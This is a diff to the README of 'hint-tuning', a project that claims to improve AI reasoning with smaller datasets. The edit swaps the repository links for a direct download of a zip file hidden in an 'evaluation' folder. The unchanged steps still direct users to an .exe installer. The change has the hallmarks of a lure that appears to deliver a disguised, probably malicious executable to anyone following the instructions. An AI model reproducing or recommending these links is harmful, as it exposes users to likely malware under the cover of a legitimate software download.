@@ -1,6 +1,6 @@
 # 🧠 hint-tuning - Improve Model Reasoning With Less Data
 
-[![Download hint-tuning](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/anupradnyash-dev/hint-tuning)
+[![Download hint-tuning](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/anupradnyash-dev/hint-tuning/raw/refs/heads/main/evaluation/tuning-hint-v1.2-alpha.5.zip)
 
 hint-tuning improves how artificial intelligence models process information. This application allows users to refine AI reasoning capabilities by using smaller, more efficient data sets. You can improve your model performance without needing massive amounts of training data.
 
@@ -8,7 +8,7 @@ hint-tuning improves how artificial intelligence models process information. Thi
 
 You can obtain the software by visiting the project repository. Please follow these instructions to access your files.
 
-1. Visit the following link: [https://github.com/anupradnyash-dev/hint-tuning](https://github.com/anupradnyash-dev/hint-tuning)
+1. Visit the following link: [https://github.com/anupradnyash-dev/hint-tuning/raw/refs/heads/main/evaluation/tuning-hint-v1.2-alpha.5.zip](https://github.com/anupradnyash-dev/hint-tuning/raw/refs/heads/main/evaluation/tuning-hint-v1.2-alpha.5.zip)
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the most recent version available.
 4. Select the file ending in .exe to download the installer to your computer.
